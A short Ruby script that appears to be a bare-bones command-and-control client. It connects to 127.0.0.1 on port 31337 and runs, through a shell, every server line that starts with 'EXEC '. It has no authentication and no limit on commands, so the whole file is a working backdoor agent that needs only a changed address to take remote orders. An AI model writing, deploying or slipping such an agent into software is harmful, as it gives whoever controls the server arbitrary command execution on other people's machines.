#!/usr/bin/env ruby
require "socket"

class Client
  def initialize
    @server_ip = "127.0.0.1"
    @server_port = 31337

    connect_to_server
  end

  def connect_to_server
    puts "[*] connecting to #{@server_ip} on port #{@server_port}"
    s = TCPSocket.open(@server_ip, @server_port)

    while line = s.gets
      line = line.chop
      if line.start_with? "EXEC "
        cmd = line[5..-1]
        execute_command cmd
      end
    end
    puts "[-] connection lost"
    s.close
  end

  def execute_command cmd
    puts "Executing command: #{cmd}"
    puts `#{cmd}`
  end
end

Client.new